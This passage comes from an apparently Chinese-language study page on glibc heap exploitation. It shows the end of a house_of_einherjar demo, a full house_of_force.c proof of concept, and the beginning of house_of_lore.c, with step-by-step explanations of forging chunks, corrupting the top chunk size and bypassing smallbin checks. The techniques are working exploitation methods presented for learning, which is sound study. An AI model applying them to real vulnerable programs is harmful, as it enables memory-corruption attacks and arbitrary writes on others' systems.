	<span class="token class-name">size_t</span> fake_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span>b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token class-name">uint8_t</span><span class="token operator">*</span><span class="token punctuation">)</span>fake_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake prev_size will be %p - %p = %#lx\n"</span><span class="token punctuation">,</span> b<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">,</span> fake_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>a<span class="token punctuation">[</span>real_a_size<span class="token operator">-</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>

	<span class="token comment">//Change the fake chunk's size to reflect b's new prev_size</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nModify fake chunk's size to reflect b's new prev_size\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_size<span class="token punctuation">;</span>

	<span class="token comment">// free b and it will consolidate with our fake chunk</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">free</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Our fake chunk size is now %#lx (b.size + fake_prev_size)\n"</span><span class="token punctuation">,</span> fake_chunk<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\nNow we can call malloc() and it will begin in our fake chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	d <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x200</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Next malloc(0x200) is at %p\n"</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span>d <span class="token operator">==</span> <span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>fake_chunk<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p>申请chunk a</p>
<p>伪造一个chunk，prev size和size均设为0x100，fd，bk，fd_nextsize和bk_nextsize均为本身</p>
<p>申请chunk b</p>
<p>a溢出一个字节使b的inuse变为0</p>
<p>调整b的prev size位为b - fake chunk，为了能让堆块头到达目标地址</p>
<p>再调整fake chunk的size为fake size</p>
<p>通过释放b&#x3D;&#x3D;》b的inuse为0&#x3D;&#x3D;》相邻空闲，合并&#x3D;&#x3D;》检查prev size&#x3D;&#x3D;》到达fake chunk检查size，符合&#x3D;&#x3D;》合并</p>
<p>&#x3D;&#x3D;&#x3D;》最后再与top chunk合并</p>
<p>&#x3D;&#x3D;&#x3D;&#x3D;》此时再从top chunk中申请即可获得目标地址chunk</p>
<p><strong>注意点：</strong>申请的chunk b应该比tcache的范围大，避免释放入tcache</p>
<h3 id="house-of-force-c"><a href="#house-of-force-c" class="headerlink" title="house_of_force.c"></a>house_of_force.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;malloc.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">char</span> bss_var<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"This is a string that we want to overwrite."</span><span class="token punctuation">;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc <span class="token punctuation">,</span> <span class="token keyword">char</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nWelcome to the House of Force\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The idea of House of Force is to overwrite the top chunk and let the malloc return an arbitrary value.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The top chunk is a special chunk. Is the last in memory "</span>
		<span class="token string">"and is the chunk that will be resized when malloc asks for more space from the os.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIn the end, we will use this to overwrite a variable at %p.\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Its current value is: %s\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>



	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nLet's allocate the first chunk, taking space from the wilderness.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>p1 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">256</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"The chunk of 256 bytes has been allocated at %p.\n"</span><span class="token punctuation">,</span> p1 <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow the heap is composed of two chunks: the one we allocated and the top chunk/wilderness.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">int</span> real_size <span class="token operator">=</span> <span class="token function">malloc_usable_size</span><span class="token punctuation">(</span>p1<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Real size (aligned and all that jazz) of our allocated chunk is %ld.\n"</span><span class="token punctuation">,</span> real_size <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow let's emulate a vulnerability that can overwrite the header of the Top Chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token comment">//----- VULNERABILITY ----</span>
	<span class="token class-name">intptr_t</span> <span class="token operator">*</span>ptr_top <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>p1 <span class="token operator">+</span> real_size <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe top chunk starts at %p\n"</span><span class="token punctuation">,</span> ptr_top<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nOverwriting the top chunk size with a big value so we can ensure that the malloc will never call mmap.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Old size of top chunk %#llx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_top <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">intptr_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_top <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"New size of top chunk %#llx\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span> <span class="token keyword">long</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ptr_top <span class="token operator">+</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token comment">//------------------------</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe size of the wilderness is now gigantic. We can allocate anything without malloc() calling mmap.\n"</span>
	   <span class="token string">"Next, we will allocate a chunk that will get us right up against the desired region (with an integer\n"</span>
	   <span class="token string">"overflow) and will then be able to allocate a chunk right over the desired region.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">unsigned</span> <span class="token keyword">long</span> evil_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>bss_var <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>ptr_top<span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nThe value we want to write to at %p, and the top chunk is at %p, so accounting for the header size,\n"</span>
	   <span class="token string">"we will malloc %#lx bytes.\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">,</span> ptr_top<span class="token punctuation">,</span> evil_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token keyword">void</span> <span class="token operator">*</span>new_ptr <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>evil_size<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"As expected, the new pointer is at the same place as the old top chunk: %p\n"</span><span class="token punctuation">,</span> new_ptr <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">void</span><span class="token operator">*</span> ctr_chunk <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nNow, the next chunk we overwrite will point at our target buffer.\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"malloc(100) => %p!\n"</span><span class="token punctuation">,</span> ctr_chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Now, we can finally overwrite that value:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... old string: %s\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... doing strcpy overwrite with \"YEAH!!!\"...\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">strcpy</span><span class="token punctuation">(</span>ctr_chunk<span class="token punctuation">,</span> <span class="token string">"YEAH!!!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"... new string: %s\n"</span><span class="token punctuation">,</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token function">assert</span><span class="token punctuation">(</span>ctr_chunk <span class="token operator">==</span> bss_var<span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token punctuation">&#125;</span></code></pre>

<p>申请一个chunk&#x3D;&#x3D;》修改top chunk的size为最大：</p>
<p><img src="https://raw.githubusercontent.com/zh-Closure/images/main/image-20220624170615405.png"></p>
<p>再分配一个chunk使top chunk到目标地址</p>
<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">long</span> evil_size <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>bss_var <span class="token operator">-</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">long</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">4</span> <span class="token operator">-</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span>ptr_top<span class="token punctuation">;</span>

<span class="token function">malloc</span><span class="token punctuation">(</span>evil_size<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>

<p>再分配一个chunk即可获得bss目标地址</p>
<h3 id="house-of-lore-c"><a href="#house-of-lore-c" class="headerlink" title="house_of_lore.c"></a>house_of_lore.c</h3><pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdint.h></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;assert.h></span></span>

<span class="token keyword">void</span> <span class="token function">jackpot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span> <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Nice jump d00d\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>


  <span class="token class-name">intptr_t</span><span class="token operator">*</span> stack_buffer_1<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token class-name">intptr_t</span><span class="token operator">*</span> stack_buffer_2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span><span class="token operator">*</span> fake_freelist<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nWelcome to the House of Lore\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is a revisited version that bypass also the hardening check introduced by glibc malloc\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"This is tested against Ubuntu 18.04.5 - 64bit - glibc-2.27\n\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating the victim chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token class-name">intptr_t</span> <span class="token operator">*</span>victim <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the first small chunk on the heap at %p\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating dummy chunks for using up tcache later\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>dummies<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> dummies<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">// victim-WORD_SIZE because we need to remove the header size in order to have the absolute address of the chunk</span>
  <span class="token class-name">intptr_t</span> <span class="token operator">*</span>victim_chunk <span class="token operator">=</span> victim<span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_1 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"stack_buffer_2 at %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Create a fake free-list on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">6</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    fake_freelist<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> fake_freelist<span class="token punctuation">[</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  fake_freelist<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"fake free-list at %p\n"</span><span class="token punctuation">,</span> fake_freelist<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Create a fake chunk on the stack\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the fwd pointer to the victim_chunk in order to bypass the check of small bin corrupted"</span>
         <span class="token string">"in second to the last malloc, which putting stack address on smallbin list\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> victim_chunk<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the bk pointer to stack_buffer_2 and set the fwd pointer of stack_buffer_2 to point to stack_buffer_1 "</span>
         <span class="token string">"in order to bypass the check of small bin corrupted in last malloc, which returning pointer to the fake "</span>
         <span class="token string">"chunk on stack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_1<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_2<span class="token punctuation">;</span>
  stack_buffer_2<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span><span class="token operator">*</span><span class="token punctuation">)</span>stack_buffer_1<span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Set the bck pointer of stack_buffer_2 to the fake free-list in order to prevent crash prevent crash "</span>
          <span class="token string">"introduced by smallbin-to-tcache mechanism\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  stack_buffer_2<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">intptr_t</span> <span class="token operator">*</span><span class="token punctuation">)</span>fake_freelist<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocating another large chunk in order to avoid consolidating the top chunk with"</span>
         <span class="token string">"the small one during the free()\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>p5 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Allocated the large chunk on the heap at %p\n"</span><span class="token punctuation">,</span> p5<span class="token punctuation">)</span><span class="token punctuation">;</span>


  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing dummy chunk\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">&lt;</span><span class="token number">7</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token function">free</span><span class="token punctuation">(</span>dummies<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"Freeing the chunk %p, it will be inserted in the unsorted bin\n"</span><span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"\nIn the unsorted bin the victim's fwd and bk pointers are nil\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->fwd: %p\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fprintf</span><span class="token punctuation">(</span><span class="token constant">stderr</span><span class="token punctuation">,</span> <span class="token string">"victim->bk: %p\n\n"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span>victim<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

